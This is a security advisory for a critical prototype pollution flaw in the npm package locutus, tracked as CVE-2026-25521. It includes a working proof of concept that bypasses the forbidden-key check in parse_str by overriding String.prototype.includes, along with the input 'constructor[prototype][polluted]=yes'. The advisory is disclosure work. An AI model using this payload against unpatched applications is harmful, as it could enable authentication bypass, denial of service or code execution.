# [C] locutus is vulnerable to Prototype Pollution

## Summary
Severity: Critical
Advisory: GHSA-rxrv-835q-v5mh
CVE: CVE-2026-25521
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-02-02
Source: https://github.com/advisories/GHSA-rxrv-835q-v5mh
Type: github-advisory

## Affected
- npm: `locutus` — affected >=2.0.12 <2.0.39

## Details
### Summary
A Prototype Pollution vulnerability exists in the the npm package locutus (>2.0.12). Despite a previous fix that attempted to mitigate Prototype Pollution by checking whether user input contained a forbidden key, it is still possible to pollute Object.prototype via a crafted input using String.prototype. This issue was fixed in version 2.0.39.

### Details
The vulnerability resides in line 77 to 79 of https://github.com/locutusjs/locutus/blob/main/src/php/strings/parse_str.js where includes() function is used to check whether user provided input contain forbidden strings.

### PoC

#### Steps to reproduce
1. Install latest version of locutus using npm install or cloning from git
2. Run the following code snippet:

```javascript
String.prototype.includes = () => false;      
console.log({}.polluted);
const locutus = require('locutus');
locutus.php.strings.parse_str('constructor[prototype][polluted]=yes');
console.log({}.polluted);  // prints yes -> indicating that the patch was bypassed and Prototype Pollution occurred
```

#### Expected behavior
Prototype Pollution should be prevented and {} should not gain new properties.
This should be printed on the console:
```
undefined
undefined OR throw an Error
```

#### Actual behavior
Object.prototype is polluted
This is printed on the console:
```
undefined 
yes
```

### Impact
This is a Prototype Pollution vulnerability, which can have severe security implications depending on how locutus is used by downstream applications. Any application that processes attacker-controlled input using this `locutus.php.strings.parse_str` may be affected. It could potentially lead to the following problems:
1. Authentication bypass
2. Denial of service
3. Remote code execution (if polluted property is passed to sinks like eval or child_process)

## References
- https://github.com/locutusjs/locutus/security/advisories/GHSA-rxrv-835q-v5mh
- https://nvd.nist.gov/vuln/detail/CVE-2026-25521
- https://github.com/locutusjs/locutus/commit/042af9ca7fde2ff599120783e720a17f335bb01c
- https://github.com/locutusjs/locutus
